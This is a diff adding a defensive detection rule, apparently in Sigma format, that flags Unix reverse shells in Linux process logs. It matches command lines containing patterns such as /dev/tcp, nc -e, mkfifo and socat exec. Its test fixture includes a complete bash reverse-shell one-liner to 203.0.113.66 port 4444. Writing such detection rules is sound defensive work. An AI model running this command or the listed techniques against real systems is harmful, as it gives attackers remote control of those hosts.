@@ -1,0 +1,28 @@
+title: Unix reverse shell
+id: lf-unix-reverse-shell
+status: stable
+description: A shell or interpreter connects its standard streams to a remote socket (bash /dev/tcp, nc -e, mkfifo pipes, socat exec, Python sockets).
+author: Logforge Security Team
+date: 2026/11/17
+references: [https://attack.mitre.org/techniques/T1059/004/]
+tags: [attack.execution, attack.t1059.004]
+falsepositives:
+    - Authorised penetration tests
+logsource: {category: process_creation, product: linux}
+detection:
+    selection:
+        command_line|contains:
+            - '/dev/tcp/'
+            - '/dev/udp/'
+            - 'nc -e '
+            - 'ncat -e '
+            - 'nc.traditional -e'
+            - 'mkfifo /tmp/'
+            - 'socat exec:'
+            - 'socat tcp-connect:'
+            - 'import socket,subprocess'
+    condition: selection
+fixtures:
+    true_positive: {process_name: /bin/bash, command_line: 'bash -i >& /dev/tcp/203.0.113.66/4444 0>&1', user: www-data}
+    true_negative: {process_name: /bin/bash, command_line: 'bash /opt/app/healthcheck.sh', user: www-data}
+level: critical
